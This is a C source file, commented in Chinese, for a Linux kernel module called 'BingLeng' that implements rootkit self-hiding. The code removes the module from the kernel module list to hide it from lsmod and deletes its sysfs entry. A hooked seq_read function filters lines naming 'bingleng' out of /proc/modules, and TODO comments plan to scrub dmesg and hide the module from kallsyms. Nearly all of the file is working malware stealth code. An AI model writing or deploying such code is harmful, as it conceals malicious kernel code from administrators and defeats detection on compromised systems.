/*
 * 冰冷 (BingLeng) - 模块自隐藏实现
 *
 * 功能：实现模块自隐藏功能，包括lsmod、sysfs、/proc/modules、dmesg等
 *
 * 作者：冰冷开发组
 */

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kobject.h>
#include <linux/seq_file.h>
#include <linux/proc_fs.h>
#include <linux/list.h>
#include <linux/string.h>
#include "hide.h"
#include "utils.h"

/* ============================================
 * 全局变量
 * ============================================
 */

/* 原始的seq_read函数指针 */
static typeof(seq_read) *orig_seq_read = NULL;

/* ============================================
 * /proc/modules 隐藏
 * ============================================
 */

/**
 * bl_hooked_seq_read - hook后的seq_read函数
 */
static ssize_t bl_hooked_seq_read(struct file *file, char __user *buf, size_t size, loff_t *ppos)
{
    ssize_t ret;
    char *kbuf = NULL;
    char *line, *next_line;
    size_t copy_size;

    /* 先调用原始函数 */
    if (orig_seq_read) {
        ret = orig_seq_read(file, buf, size, ppos);
    } else {
        /* 如果没有hook原始函数，直接返回 */
        return -EFAULT;
    }

    if (ret <= 0) {
        return ret;
    }

    /* 分配内核缓冲区 */
    kbuf = bl_kmalloc(ret + 1, GFP_KERNEL);
    if (!kbuf) {
        return ret;
    }

    /* 从用户空间复制回来 */
    if (copy_from_user(kbuf, buf, ret)) {
        bl_kfree(kbuf);
        return ret;
    }
    kbuf[ret] = '\0';

    /* 过滤掉包含"bingleng"的行 */
    line = kbuf;
    copy_size = 0;
    while ((next_line = strchr(line, '\n')) != NULL) {
        *next_line = '\0';
        if (strstr(line, "bingleng") == NULL) {
            /* 保留这一行 */
            size_t line_len = next_line - line + 1;
            if (copy_size + line_len <= size) {
                if (copy_to_user(buf + copy_size, line, line_len)) {
                    break;
                }
                copy_size += line_len;
            }
        }
        line = next_line + 1;
    }

    bl_kfree(kbuf);
    return copy_size > 0 ? copy_size : ret;
}

/* ============================================
 * 模块隐藏主函数
 * ============================================
 */

/**
 * bl_hide_module - 隐藏内核模块
 */
int bl_hide_module(void)
{
    bl_printk(BL_LOG_INFO, "开始隐藏模块...\n");

    /* 1. 从模块链表中移除（隐藏lsmod） */
    list_del(&THIS_MODULE->list);
    bl_printk(BL_LOG_DEBUG, "已从模块链表移除\n");

    /* 2. 从sysfs中移除 */
    kobject_del(&THIS_MODULE->mkobj.kobj);
    bl_printk(BL_LOG_DEBUG, "已从sysfs移除\n");

    /* 3. TODO: Hook seq_read隐藏/proc/modules */
    /* 需要先找到seq_read的地址并hook它 */

    /* 4. TODO: 清理dmesg中的模块名 */
    /* 需要遍历log_buf并覆盖模块名 */

    /* 5. TODO: 从kallsyms中隐藏 */
    /* 可选，需要hook kallsyms的输出 */

    bl_printk(BL_LOG_INFO, "模块隐藏完成\n");
    return 0;
}

/**
 * bl_unhide_module - 取消隐藏模块
 */
void bl_unhide_module(void)
{
    bl_printk(BL_LOG_INFO, "取消隐藏模块（退出时）\n");
    /* 注意：退出时可能已经无法完全恢复 */
    
    /* TODO: 恢复seq_read hook */
    /* TODO: 尝试恢复模块链表 */
}
